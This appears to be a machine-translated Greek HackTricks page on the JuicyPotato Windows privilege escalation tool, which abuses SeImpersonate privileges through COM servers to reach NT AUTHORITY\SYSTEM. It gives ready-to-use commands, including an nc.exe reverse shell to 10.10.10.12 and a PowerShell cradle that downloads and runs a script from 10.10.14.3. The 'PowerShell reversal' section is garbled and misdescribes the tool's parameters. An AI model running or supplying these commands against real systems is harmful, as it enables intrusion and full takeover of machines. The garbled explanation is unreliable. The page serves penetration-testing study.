# JuicyPotato

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Εγγραφείτε** στην [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο** [**αποθετήριο hacktricks**](https://github.com/carlospolop/hacktricks) **και** [**αποθετήριο hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

{% hint style="warning" %}
**Το JuicyPotato δεν λειτουργεί** στα Windows Server 2019 και στα Windows 10 build 1809 και μεταγενέστερα. Ωστόσο, μπορείτε να χρησιμοποιήσετε τα [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) για να **εκμεταλλευτείτε τα ίδια προνόμια και να αποκτήσετε πρόσβαση σε επίπεδο `NT AUTHORITY\SYSTEM`**. _**Ελέγξτε:**_
{% endhint %}

{% content-ref url="roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](roguepotato-and-printspoofer.md)
{% endcontent-ref %}

## Juicy Potato (κατάχρηση των χρυσών προνομίων) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Μια γλυκιά έκδοση του_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, με λίγο χυμό, δηλαδή ένα εργαλείο **Ανόδου Προνομίων Τοπικού Επιπέδου, από Λογαριασμούς Υπηρεσίας Windows σε NT AUTHORITY\SYSTEM**_

#### Μπορείτε να κατεβάσετε το juicypotato από [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Περίληψη <a href="#summary" id="summary"></a>

**[Από το Readme του juicy-potato](https://github.com/ohpe/juicy-potato/blob/master/README.md):**

Το [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) και οι [παραλλαγές](https://github.com/decoder-it/lonelypotato) του εκμεταλλεύονται την αλυσίδα ανόδου προνομίων βασισμένη στην υπηρεσία [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) έχοντας τον ακροατή MiTM στη διεύθυνση `127.0.0.1:6666` και όταν έχετε τα προνόμια `SeImpersonate` ή `SeAssignPrimaryToken`. Κατά την αναθεώρηση μιας εγκατάστασης Windows, ανακαλύψαμε μια ρύθμιση όπου το `BITS` ήταν απενεργοποιημένο εσκεμμένα και η θύρα `6666` ήταν κατειλημμένη.

Αποφασίσαμε να εκμεταλλευτούμε το [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Πείτε γεια στο Juicy Potato**.

> Για τη θεωρία, δείτε [Rotten Potato - Ανόδος Προνομίων από Λογαριασμούς Υπηρεσίας σε SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) και ακολουθήστε την αλυσίδα των συνδέσμων και των αναφορών.

Ανακαλύψαμε ότι, εκτός από το `BITS`, υπάρχουν αρκετοί COM servers που μπορούμε να καταχρηστείτε. Απλά πρέπει να:

1. είναι δυνατή η δημιουργία αντικειμένων από τον τρέχοντα χρήστη, συνήθως ένας "χρήστης υπηρεσίας" που έχει προνόμια προσομοίωσης
2. υλοποιούν τη διεπαφή `IMarshal`
3. εκτελούνται ως χρήστης με αυξημένα προνόμια (SYSTEM, Administrator, ...)

Μετά από μερικές δοκιμές, αποκτήσαμε και δοκιμάσαμε μια εκτενή λίστα [ενδιαφέροντων CLSID](http://ohpe.it/juicy-potato/CLSID/) σε διάφορες εκδόσεις των Windows.

### Λεπτομέρειες για το Juicy
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Τελικές σκέψεις <a href="#final-thoughts" id="final-thoughts"></a>

**[Από το αρχείο Readme του juicy-potato](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts):**

Εάν ο χρήστης έχει τα δικαιώματα `SeImpersonate` ή `SeAssignPrimaryToken`, τότε είστε **SYSTEM**.

Είναι σχεδόν αδύνατο να αποτρέψετε την κατάχρηση όλων αυτών των COM Servers. Μπορείτε να σκεφτείτε να τροποποιήσετε τα δικαιώματα αυτών των αντικειμένων μέσω του `DCOMCNFG`, αλλά καλή τύχη, αυτό θα είναι πρόκληση.

Η πραγματική λύση είναι να προστατεύσετε τους ευαίσθητους λογαριασμούς και τις εφαρμογές που εκτελούνται υπό τους λογαριασμούς `* SERVICE`. Η διακοπή του `DCOM` θα αναστείλει σίγουρα αυτήν την εκμετάλλευση, αλλά μπορεί να έχει σοβαρές επιπτώσεις στο υποκείμενο λειτουργικό σύστημα.

Από: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## Παραδείγματα

Σημείωση: Επισκεφθείτε [αυτήν τη σελίδα](https://ohpe.it/juicy-potato/CLSID/) για μια λίστα με τα CLSIDs που μπορείτε να δοκιμάσετε.

### Λήψη αντίστροφης κατεύθυνσης κέλυφους με το nc.exe
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Αναστροφή Powershell

Η αναστροφή Powershell είναι μια τεχνική που χρησιμοποιείται για να εκτελέσετε κώδικα Powershell από μια εφαρμογή ή μια διαδικασία με υψηλότερα δικαιώματα. Αυτό μπορεί να επιτρέψει σε έναν επιτιθέμενο να αναβαθμίσει τα δικαιώματά του και να αποκτήσει πρόσβαση διαχειριστή σε ένα σύστημα Windows.

Για να εκτελέσετε μια αναστροφή Powershell, ακολουθήστε τα παρακάτω βήματα:

1. Επιλέξτε μια εφαρμογή ή μια διαδικασία με υψηλότερα δικαιώματα που μπορείτε να εκτελέσετε κώδικα Powershell από αυτήν.
2. Κατεβάστε ένα αντίγραφο του αρχείου `JuicyPotato.exe` από τον σύνδεσμο [εδώ](https://github.com/ohpe/juicy-potato/releases).
3. Εκτελέστε το αρχείο `JuicyPotato.exe` με τις κατάλληλες παραμέτρους για να εκτελέσετε τον κώδικα Powershell. Για παράδειγμα, μπορείτε να χρησιμοποιήσετε την παράμετρο `-t` για να καθορίσετε τον τύπο του αντικειμένου που θα εκτελέσει τον κώδικα Powershell και την παράμετρο `-p` για να καθορίσετε τον καταχωρητή που θα χρησιμοποιηθεί.
4. Αν η αναστροφή Powershell είναι επιτυχής, θα εκτελεστεί ο κώδικας Powershell με υψηλότερα δικαιώματα και θα αποκτήσετε πρόσβαση διαχειριστή στο σύστημα Windows.

Είναι σημαντικό να σημειωθεί ότι η αναστροφή Powershell είναι μια επιθετική τεχνική και πρέπει να χρησιμοποιείται μόνο για νόμιμους σκοπούς, όπως η δοκιμή ασφάλειας συστημάτων.
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Εκκίνηση νέου CMD (εάν έχετε πρόσβαση RDP)

![](<../../.gitbook/assets/image (37).png>)

## Προβλήματα με το CLSID

Συχνά, το προεπιλεγμένο CLSID που χρησιμοποιεί το JuicyPotato **δεν λειτουργεί** και η εκμετάλλευση αποτυγχάνει. Συνήθως, απαιτούνται πολλές προσπάθειες για να βρεθεί ένα **εργαστήριο CLSID**. Για να λάβετε μια λίστα με τα CLSID που πρέπει να δοκιμάσετε για ένα συγκεκριμένο λειτουργικό σύστημα, πρέπει να επισκεφθείτε αυτήν τη σελίδα:

{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}

### **Έλεγχος των CLSID**

Πρώτα, θα χρειαστείτε μερικά εκτελέσιμα αρχεία εκτός από το juicypotato.exe.

Κατεβάστε το [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) και φορτώστε το στην PS συνεδρίασή σας, κατεβάστε και εκτελέστε το [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Αυτό το σενάριο θα δημιουργήσει μια λίστα πιθανών CLSID για να δοκιμάσετε.

Στη συνέχεια, κατεβάστε το [test\_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat)(αλλάξτε τη διαδρομή για τη λίστα CLSID και για το εκτελέσιμο juicypotato) και εκτελέστε το. Θα αρχίσει να δοκιμάζει κάθε CLSID και **όταν ο αριθμός θύρας αλλάξει, θα σημαίνει ότι το CLSID λειτούργησε**.

**Ελέγξτε** τα εργαστήρια CLSID **χρησιμοποιώντας την παράμετρο -c**

## Αναφορές
* [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)

<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Εγγραφείτε στην** [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs στο** [**αποθετήριο hacktricks**](https://github.com/carlospolop/hacktricks) **και** [**αποθετήριο hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
